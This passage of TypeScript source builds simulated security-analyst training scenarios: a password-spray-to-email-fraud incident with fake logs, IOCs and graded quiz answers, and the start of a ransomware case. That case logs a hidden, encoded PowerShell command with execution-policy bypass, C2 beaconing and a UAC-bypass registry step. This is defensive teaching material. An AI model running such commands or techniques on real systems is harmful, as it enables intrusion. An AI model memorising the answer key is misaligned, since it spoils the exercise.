      user_email: "a.nelson@cryotech.com", src_ip: sprayIp,
      severity: "medium",
      description: `Account a.nelson was locked out after 5 failed password attempts from ${sprayIp}.`,
      raw: {
        // Windows Security Event 4740 — Account Locked Out
        "winlog.event_id": "4740",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048302",
        // Subject (SYSTEM on DC)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "DC01$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // Target account that was locked out
        "winlog.event_data.TargetUserName": "a.nelson",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1104",
        // Machine that triggered the lockout
        "winlog.event_data.CallerComputerName": "\\\\158.131.159.30",
        // ECS fields
        "event.code": "4740",
        "event.action": "account-locked-out",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:01:00.000Z",
        "user.name": "a.nelson",
        "user.domain": "CRYOTECH",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1104",
        "host.name": "DC01",
        "source.ip": sprayIp,
        "account.locked": "true",
        "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
      },
    },
    {
      id: "evt_03_lockout_2", ts: T(2 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_failure",
      user_email: "r.garcia@cryotech.com", src_ip: sprayIp,
      severity: "medium",
      description: `Account r.garcia was also locked out from ${sprayIp}, minutes after a.nelson.`,
      raw: {
        // Windows Security Event 4740 — Account Locked Out
        "winlog.event_id": "4740",
        "winlog.channel": "Security",
        "winlog.computer_name": "DC01",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048315",
        // Subject (SYSTEM on DC)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "DC01$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // Target account that was locked out
        "winlog.event_data.TargetUserName": "r.garcia",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetSid": "S-1-5-21-3421479547-3897544621-1789562108-1106",
        // Machine that triggered the lockout
        "winlog.event_data.CallerComputerName": "\\\\158.131.159.30",
        // ECS fields
        "event.code": "4740",
        "event.action": "account-locked-out",
        "event.outcome": "failure",
        "event.created": "2026-05-08T08:02:00.000Z",
        "user.name": "r.garcia",
        "user.domain": "CRYOTECH",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1106",
        "host.name": "DC01",
        "source.ip": sprayIp,
        "account.locked": "true",
        "authentication.failure_reason": "0xC0000234 — Account Locked Out (too many failed attempts)",
      },
    },
    {
      id: "evt_04_mfa_accept", ts: T(12 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_challenge",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1078",
      description: `l.harris approved an MFA push at 02:12 local time from Amsterdam, Netherlands (${attackerIp}).`,
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA fatigue victim accepted push
        "azure.signinlogs.correlation_id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "azure.signinlogs.result_type": "0",
        "azure.signinlogs.result_description": "Successfully signed in",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "high",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "l.harris@cryotech.com",
        "azure.signinlogs.user_display_name": "Laura Harris",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.device_detail.browser": "Chrome 124.0.0",
        "azure.signinlogs.device_detail.operating_system": "Windows 10",
        "azure.signinlogs.device_detail.device_id": "(not registered)",
        "azure.signinlogs.device_detail.is_compliant": "false",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.location.city": "Amsterdam",
        "azure.signinlogs.location.country_or_region": "NL",
        "azure.signinlogs.mfa_detail.auth_method": "Phone app notification",
        "azure.signinlogs.mfa_detail.auth_detail": "MFA completed in mobile app",
        "azure.signinlogs.authentication_details": "1st factor: Password (success)|2nd factor: Microsoft Authenticator push (accepted by user)|Context: first sign-in from NL|Risk: High|CA policy: none matched",
        // ECS fields
        "event.action": "UserLoggedIn",
        "event.outcome": "success",
        "event.created": "2026-05-08T08:12:00.000Z",
        "user.email": "l.harris@cryotech.com",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "authentication.status": "success",
        "authentication.mfa": "Microsoft Authenticator Push",
        "authentication.factor": "push_notification",
        "risk.level": "High",
        "logon.local_time": "02:12",
        "ca_policy_applied": "none",
      },
    },
    {
      id: "evt_05_inbox_rule", ts: T(13 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical", mitre_technique: "T1564.008",
      description: `A new inbox rule named ".." was created in l.harris's mailbox from ${attackerIp}: emails containing wire or banking are moved to RSS Feeds and marked as read.`,
      raw: {
        // O365 Unified Audit Log — New-InboxRule
        "data.office365.Id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "data.office365.RecordType": "1",
        "data.office365.RecordType_description": "ExchangeAdmin",
        "data.office365.CreationTime": "2026-05-08T08:13:00Z",
        "data.office365.Operation": "New-InboxRule",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@cryotech.com",
        "data.office365.UserKey": "a1b2c3d4-e5f6-a1b2-c3d4-e5f6a1b2c3d4",
        "data.office365.UserType": "0",
        "data.office365.UserType_description": "Regular",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.ExternalAccess": "false",
        // Exchange rule detail fields
        "exchange.cmdlet.name": "New-InboxRule",
        "exchange.rule.name": "․․",
        "exchange.rule.condition.body_or_subject_contains": "wire, invoice, banking, payment, transfer",
        "exchange.rule.action.move_to_folder": "RSS Feeds",
        "exchange.rule.action.mark_as_read": "true",
        "exchange.rule.action.stop_processing_rules": "true",
        // ECS fields
        "event.action": "New-InboxRule",
        "event.outcome": "success",
        "user.email": "l.harris@cryotech.com",
        "source.ip": attackerIp,
      },
    },
    {
      id: "evt_06_email_scrape", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `340 emails were accessed in l.harris's mailbox within 2 minutes via Outlook Web App from ${attackerIp}.`,
      raw: {
        // O365 Unified Audit Log — MailItemsAccessed (ExchangeItemAggregated)
        "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "data.office365.RecordType": "50",
        "data.office365.RecordType_description": "ExchangeItemAggregated",
        "data.office365.CreationTime": "2026-05-08T08:15:00Z",
        "data.office365.Operation": "MailItemsAccessed",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@cryotech.com",
        "data.office365.MailboxOwnerUPN": "l.harris@cryotech.com",
        "data.office365.MailboxOwnerSid": "S-1-5-21-3421479547-3897544621-1789562108-1201",
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.ExternalAccess": "false",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy;ProxyUpstreamProtocol=EWS",
        "data.office365.IsThrottled": "false",
        // Mail access detail fields
        "mail.access_method": "Sync",
        "mail.items_accessed": "340",
        "mail.folders_accessed": "Inbox, Sent Items, Drafts",
        "mail.access_type": "Bind",
        "mail.time_window_seconds": "112",
        // ECS fields
        "event.action": "MailItemsAccessed",
        "event.outcome": "success",
        "user.email": "l.harris@cryotech.com",
        "source.ip": attackerIp,
        "application.name": "Outlook Web App",
        "session.duration_seconds": "112",
      },
    },
    {
      id: "evt_07_forward_rule", ts: T(20 * MIN),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "account_modify",
      user_email: victim.email, src_ip: attackerIp,
      severity: "high", mitre_technique: "T1114.003",
      description: "l.harris's mailbox was configured to auto-forward all incoming email to an external Gmail address (l.harris.backup@gmail.com).",
      raw: {
        // O365 Unified Audit Log — Set-Mailbox (ForwardingSmtpAddress)
        "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a1",
        "data.office365.RecordType": "1",
        "data.office365.RecordType_description": "ExchangeAdmin",
        "data.office365.CreationTime": "2026-05-08T08:20:00Z",
        "data.office365.Operation": "Set-Mailbox",
        "data.office365.OrganizationId": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@cryotech.com",
        "data.office365.ObjectId": "l.harris@cryotech.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        "data.office365.SessionId": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        // Exchange forwarding detail
        "exchange.cmdlet.name": "Set-Mailbox",
        "exchange.cmdlet.param.ForwardingSmtpAddress": "smtp:l.harris.backup@gmail.com",
        "exchange.cmdlet.param.DeliverToMailboxAndForward": "true",
        "exchange.cmdlet.param.ForwardingAddress": "(null)",
        "exchange.forward.external_domain": "gmail.com",
        // ECS fields
        "event.action": "Set-Mailbox",
        "event.outcome": "success",
        "user.email": "l.harris@cryotech.com",
        "source.ip": attackerIp,
        "email.forwarding_address": "l.harris.backup@gmail.com",
        "email.deliver_and_forward": "true",
      },
    },
    {
      id: "evt_08_wire_fraud", ts: T(25 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_sent",
      user_email: victim.email, src_ip: attackerIp,
      severity: "critical",
      description: `l.harris's account sent an email to CFO p.johnson requesting a $247,000 wire transfer to new banking details, replying inside an existing Apex Supplies invoice thread.`,
      raw: {
        // O365 Unified Audit Log — Send (ThreatIntelligence record type for BEC)
        "data.office365.Id": "e5f6a1b2-c3d4-e5f6-a1b2-c3d4e5f6a1b2",
        "data.office365.RecordType": "28",
        "data.office365.RecordType_description": "ThreatIntelligence",
        "data.office365.CreationTime": "2026-05-08T08:25:00Z",
        "data.office365.Operation": "Send",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": "l.harris@cryotech.com",
        "data.office365.ResultStatus": "True",
        "data.office365.ClientIP": attackerIp,
        // Email fields
        "email.message_id": "<CABcD3f7e2a1b9c8d4e5f6a7b8c9d0e1f2a3b4c5@mail.outlook.com>",
        "email.from.address": "l.harris@cryotech.com",
        "email.from.display_name": "Laura Harris",
        "email.to.address": "p.johnson@cryotech.com",
        "email.subject": "RE: Apex Supplies — Urgent payment update",
        "email.direction": "outbound",
        "email.size_bytes": "4217",
        // BEC enrichment fields
        "bec.original_thread_subject": "Apex Supplies — Q2 invoice",
        "bec.amount_usd": "247000",
        // ECS fields
        "event.action": "EmailSent",
        "event.outcome": "success",
        "source.ip": attackerIp,
      },
    },
    {
      id: "evt_09_mfa_fatigue", ts: T(30 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "mfa_denied",
      user_email: "p.johnson@cryotech.com", src_ip: sprayIp,
      severity: "high", mitre_technique: "T1621",
      description: "p.johnson (CFO) received 8 MFA push notifications in 5 minutes from the same spray IP and denied all of them, then reported it to IT.",
      raw: {
        // Azure AD / Entra ID Sign-In Log — MFA denied (all attempts)
        "azure.signinlogs.correlation_id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c3",
        "azure.signinlogs.result_type": "50074",
        "azure.signinlogs.result_description": "Strong Authentication is required — all attempts denied by user",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "medium",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "p.johnson@cryotech.com",
        "azure.signinlogs.user_display_name": "Patricia Johnson",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.location.city": "Amsterdam",
        "azure.signinlogs.location.country_or_region": "NL",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.mfa_detail.auth_method": "Phone app notification",
        "azure.signinlogs.mfa_detail.auth_detail": "MFA denied by user — all 8 attempts",
        "azure.signinlogs.authentication_details": "Push #1: Denied|Push #2: Denied|Push #3: Denied|Push #4: Denied|Push #5: Denied|Push #6: Denied|Push #7: Denied|Push #8: Denied|User reported suspicious via Authenticator app",
        // ECS fields
        "event.action": "MFA_PushDenied",
        "event.outcome": "failure",
        "authentication.mfa": "push",
        "authentication.status": "failure",
        "authentication.factor": "push_notification",
        "user.email": "p.johnson@cryotech.com",
        "source.ip": sprayIp,
        "mfa.push_count": "8",
        "mfa.window_minutes": "5",
      },
    },
    {
      id: "evt_10_benign_browse", ts: T(-30 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      severity: "informational",
      description: "l.harris browsed personal Gmail and LinkedIn from LAPTOP-FIN-04 before work hours.",
      raw: {
        "event.action": "http_request", "event.outcome": "success",
        "url.full": "https://gmail.com", "url.domain": "gmail.com",
        "url.category": "Webmail - Personal",
        "http.request.method": "GET",
        "user.email": "l.harris@cryotech.com",
        "host.name": "LAPTOP-FIN-04",
        "source.ip": "10.10.30.21",
        "network.bytes_out": "12430",
        "action_result": "allow",
      },
    },

    // ── CORRELATED: Baseline — l.harris normal AD login from office IP ───────────
    {
      id: "evt_bec_baseline_ad", ts: T(-20 * MIN),
      source: "ad", vendor: "Windows Security",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email, hostname: victim.hostname, src_ip: victim.ip,
      description: "l.harris logged on interactively to LAPTOP-FIN-04 from the office network.",
      raw: {
        "event.code": "4624",
        "winlog.channel": "Security",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": victim.hostname,
        "winlog.event_data.IpAddress": victim.ip,
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.TargetUserName": "l.harris",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": victim.ip,
        "host.name": victim.hostname,
      },
    },

    // ── CORRELATED: Firewall — spray IP connection volume to ADFS proxy port 443 ─
    {
      id: "evt_bec_fw_spray", ts: T(0),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS",
      event_type: "net_connection", severity: "high",
      mitre_technique: "T1110.003",
      src_ip: sprayIp, dst_ip: "10.10.1.15", dst_port: 443,
      description: `The firewall logged 47 inbound HTTPS connections from ${sprayIp} to the ADFS extranet proxy (adfs.cryotech.com) in 4 minutes.`,
      raw: {
        "event.action": "allow",
        "source.ip": sprayIp,
        "destination.ip": "10.10.1.15",
        "destination.port": "443",
        "destination.host": "adfs.cryotech.com",
        "pan.app": "ms-adfs",
        "pan.action": "allow",
        "pan.rule": "ALLOW-INBOUND-ADFS",
        "source.geo.country_name": "Netherlands",
        "source.geo.city_name": "Amsterdam",
        "threat.category": "BruteForce",
      },
    },

    // ── CORRELATED: O365 mailbox access from attacker IP immediately after login ──
    {
      id: "evt_bec_mailbox_access", ts: T(12 * MIN + 30_000),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: attackerIp,
      mitre_technique: "T1114.002",
      description: `l.harris's mailbox was accessed from ${attackerIp} just 30 seconds after the MFA push was approved.`,
      raw: {
        "data.office365.Operation": "MailboxLogin",
        "data.office365.Workload": "Exchange",
        "data.office365.UserId": victim.email,
        "data.office365.ClientIP": attackerIp,
        "data.office365.ResultStatus": "Succeeded",
        "data.office365.ClientInfoString": "Client=OWA;Action=ViaProxy",
        "mail.access_type": "MailboxLogin",
        "mail.folder_accessed": "Inbox",
        "event.action": "MailboxLogin",
        "event.outcome": "success",
        "source.ip": attackerIp,
        "source.geo.country_name": "Netherlands",
        "user.email": victim.email,
      },
    },
  ];

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",    value: sprayIp,                       reputation: "malicious",  tags: ["spray", "netherlands"] },
    { type: "ip",    value: attackerIp,                    reputation: "malicious",  tags: ["attacker", "bec"] },
    { type: "email", value: "l.harris.backup@gmail.com",   reputation: "suspicious", tags: ["exfil-target", "personal"] },
    { type: "user",  value: victim.email,                  reputation: "suspicious", tags: ["victim", "compromised"] },
    { type: "user",  value: "support@cryotech-vendor.xyz", reputation: "suspicious", tags: ["attacker-email"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Credential Access",        action: "Password spray — 47 failures across 14 accounts from 158.131.159.30" },
    { ts: T(12 * MIN), phase: "Initial Access",           action: "l.harris accepted MFA push at 02:12 from Netherlands — account compromised" },
    { ts: T(13 * MIN), phase: "Persistence / Collection", action: "Hidden inbox rule '..' intercepts all wire/invoice/payment emails → RSS Feeds" },
    { ts: T(15 * MIN), phase: "Collection",               action: "340 emails scraped in 2 minutes — attacker profiles payment workflows" },
    { ts: T(20 * MIN), phase: "Persistence",              action: "Auto-forward to personal gmail — persistent copy of all inbound mail" },
    { ts: T(25 * MIN), phase: "Impact",                   action: "$247K wire fraud email sent to CFO from compromised account" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "What is the PRIMARY intent of the hidden inbox rule named '..'?", kind: "single",
      options: [
        { value: "bec",      label: "Hide wire-fraud replies from the victim to facilitate BEC fraud" },
        { value: "persist",  label: "Maintain persistent mailbox access after the password is reset" },
        { value: "archival", label: "Personal email archiving the user set up to tidy their inbox" },
        { value: "spam",     label: "Anti-spam routing that moves flagged mail out of the inbox" },
      ],
      answer: "bec", xp: 75,
      explanation: "The rule filters wire/invoice/banking/payment emails into a hidden folder. This prevents the real l.harris from seeing that a fraudulent wire transfer was requested and confirmed — the classic BEC playbook. The Unicode dot name (..) makes it invisible in the standard Outlook UI." },
    { id: "q2", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1110.003", label: "T1110.003 — Password Spraying" },
        { value: "T1078",     label: "T1078 — Valid Accounts (MFA fatigue bypass)" },
        { value: "T1564.008", label: "T1564.008 — Hide Artifacts: Email Hiding Rules" },
        { value: "T1486",     label: "T1486 — Data Encrypted for Impact (ransomware)" },
      ],
      answer: ["T1110.003", "T1078", "T1564.008"], xp: 100,
      explanation: "T1110.003 (password spray), T1078 (valid account via MFA fatigue), and T1564.008 (hidden inbox rule) are all present. There is no ransomware — this is purely an identity/BEC attack." },
    { id: "q3", prompt: "The CFO (p.johnson) received 8 MFA push notifications in 5 minutes. What attack technique is this?", kind: "single",
      options: [
        { value: "fatigue", label: "MFA fatigue (prompt bombing) — T1621" },
        { value: "bypass",  label: "MFA bypass via SIM swapping" },
        { value: "replay",  label: "MFA token replay attack" },
        { value: "phish",   label: "Real-time phishing proxy (Evilginx)" },
      ],
      answer: "fatigue", xp: 50,
      explanation: "Sending rapid MFA push notifications hoping the user accidentally or frustratingly approves one is called MFA fatigue or prompt bombing (T1621). The CFO correctly rejected all 8 and reported to IT — an example of good security awareness." },
    { id: "q4", prompt: "Revoking l.harris's session tokens alone does NOT fully stop the attacker. Why?", kind: "single",
      options: [
        { value: "forward", label: "The email forwarding rule to gmail.com continues delivering mail without an active session" },
        { value: "cache",   label: "Outlook keeps a cached copy of the session token that survives revocation until the client is restarted" },
        { value: "oauth",   label: "A malicious OAuth application was consented to in the tenant and holds its own refresh token" },
        { value: "backup",  label: "The attacker created a second global admin account that keeps working after l.harris is locked out" },
      ],
      answer: "forward", xp: 75,
      explanation: "The auto-forwarding rule (Set-Mailbox) was configured at the Exchange transport level — it continues forwarding all inbound email to the attacker's gmail address indefinitely, even after the active session is revoked. Both the session revocation AND the forwarding/inbox rules must be removed." },
  ];

  return {
    scenario_id: scenarioId,
    title: "Password Spray → BEC Mailbox Rule",
    threat_actor: "TA-VOIDPELICAN (Business Email Compromise operator)",
    attack_kind: "identity_bec",
    briefing: "Entra ID flagged 47 failed sign-ins against Cryotech accounts from a single external address just after 08:00, and a.nelson and r.garcia both locked out. At 08:26 CFO p.johnson called the help desk to report unexpected prompts on his phone.",
    narrative: `Over a 4-minute window at 08:00, 47 authentication failures hit Finance and Executive accounts from a single Dutch IP — deliberately staying under the 5-attempt lockout threshold on most accounts. At 08:12, l.harris accepted an MFA push at 02:12 local time. Six minutes later the attacker had created a hidden inbox rule intercepting all wire/invoice/payment emails, scraped 340 emails to profile payment workflows, and enabled forwarding to a personal gmail address. At 08:25 a fraudulent $247K wire transfer request landed in the CFO's inbox. The CFO also received 8 MFA push notifications in 5 minutes — a fatigue attack to compromise the payment approver too. Your job: reconstruct the attack chain, identify all persistence mechanisms, and determine why revoking the session isn't enough.`,
    learning_objectives: [
      "Identify password spraying by recognizing below-threshold multi-account failure patterns",
      "Understand MFA fatigue (prompt bombing) and why push notifications are exploitable",
      "Detect hidden Exchange inbox rules used for Business Email Compromise interception",
      "Understand why session revocation alone is insufficient when forwarding rules exist",
      "Prioritize containment steps for an active BEC incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 3: Ransomware Outbreak — LockBit 3.0
// =========================================================================

export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"): ScenarioBundle {
  const B = new Date("2026-05-06T03:15:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const zero    = { hostname: "WS-FIN-1193", email: "c.martin@cryotech.com",  ip: "10.10.20.33" };
  const server  = { hostname: "FS-CORP-01",  email: "svc-backup@cryotech.com", ip: "10.10.10.12" };
  const c2Ip    = "185.220.101.45";
  const c2Dom   = "cobalt-cdn-updates.xyz";
  const rswHash = makeSha256("lockbit3_ransom_payload");
  const psxHash = makeSha256("psexec_lateral_tool");

  const events: TelemetryEvent[] = [
    {
      id: "evt_00_context", ts: T(-30 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "informational",
      description: "c.martin logged on to WS-FIN-1193 at 02:45 — outside normal business hours.",
      raw: {
        // Windows Security Event 4624 — Successful Logon (unusual time: 02:45)
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-1193",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "1048196",
        // Subject (SYSTEM on interactive logon)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-1193$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1205",
        "winlog.event_data.TargetUserName": "cmartin",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetLogonId": "0x7A1B33",
        "winlog.event_data.LogonGuid": "{B2C3D4E5-F6A1-B2C3-D4E5-F6A1B2C3D4E5}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-1193",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.33",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-06T02:45:00.000Z",
        "user.name": "CRYOTECH\\cmartin",
        "user.domain": "CRYOTECH",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1205",
        "host.name": "WS-FIN-1193",
        "source.ip": "10.10.20.33",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
        "logon.type_description": "Interactive (local console)",
      },
    },
    {
      id: "evt_01_phish", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: zero.email, src_ip: "91.108.56.200",
      severity: "high", mitre_technique: "T1566.001",
      description: "c.martin received an email with a macro-enabled Word attachment (Salary_Adjustment_Notice.docm) from a domain registered 2 days ago. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "payroll@cryotech-updates.net",
        "email.to.address": "c.martin@cryotech.com",
        "email.subject": "Salary Adjustment Notice — Immediate Review Required",
        "email.attachment.name": "Salary_Adjustment_Notice.docm",
        "email.direction": "inbound",
        "file.size": "52480",
        "source.ip": "91.108.56.200",
        "spf.result": "fail", "dkim.result": "fail",
        "action_result": "delivered",
        "threat.category": "Phishing",
      },
    },
    {
      id: "evt_02_macro", ts: T(45_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: zero.hostname, user_email: zero.email, src_ip: zero.ip,
      severity: "critical", mitre_technique: "T1059.001",
      description: "WINWORD.EXE on WS-FIN-1193 spawned a hidden, Base64-encoded PowerShell process 45 seconds after the phishing mail was delivered.",
      process: {
        name: "powershell.exe", pid: 7741, parent_name: "WINWORD.EXE", parent_pid: 2244,
        cmdline: "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        user: "CRYOTECH\\cmartin", integrity: "medium",
      },
      raw: {
        "event.action": "process_created",
        "process.name": "powershell.exe", "process.pid": "7741",
        "process.command_line": "powershell.exe -ep bypass -WindowStyle Hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==",
        "process.parent.name": "WINWORD.EXE", "process.parent.pid": "2244",
        "user.name": "CRYOTECH\\cmartin", "host.name": "WS-FIN-1193",
        "process.integrity": "medium",
      },
    },
    {
      id: "evt_03_c2", ts: T(3 * MIN),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: zero.hostname, src_ip: zero.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { domain: c2Dom, url: `https://${c2Dom}/updates`, bytes_out: 1024, bytes_in: 8192 },
      description: `powershell.exe on WS-FIN-1193 began connecting to ${c2Dom} every 60 seconds. The site uses a self-signed certificate and the domain was registered 2 days ago.`,
      raw: {
        "event.action": "network-connection-allowed",
        "source.ip": "10.10.20.33", "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "url.full": `https://${c2Dom}/updates`, "url.domain": c2Dom,
        "tls.version": "TLSv1.3", "tls.server.subject": `CN=${c2Dom}`,
        "tls.server.issuer": `CN=${c2Dom}`,
        "tls.certificate.self_signed": "true",
        "tls.server_certificate.not_after": "2026-08-15",
        "network.vlan.id": "10",
        "action_result": "allow", "tls_inspection": "disabled",
      },
    },
    // Privilege escalation. Opening lsass.exe with PROCESS_ALL_ACCESS needs
    // SeDebugPrivilege, which a medium-integrity process does not hold — so the
    // beacon has to elevate first. The fodhelper UAC bypass is the step that
    // makes the credential dump below possible, and it leaves its own tracks.
    {
      id: "evt_03b_uac_regkey", ts: T(87 * MIN),
      source: "sysmon", vendor: "Microsoft Sysmon", event_type: "registry_set",
      hostname: zero.hostname, user_email: zero.email,
      severity: "high", mitre_technique: "T1548.002",
      description: "A DelegateExecute value was written under the ms-settings shell-open key in c.martin's registry hive on WS-FIN-1193.",
      raw: {
        "event.code": "13",
        "winlog.provider_name": "Microsoft-Windows-Sysmon",
        "winlog.channel": "Microsoft-Windows-Sysmon/Operational",
        "winlog.event_data.UtcTime": "2026-05-06T04:42:00.000Z",
        "winlog.event_data.EventType": "SetValue",
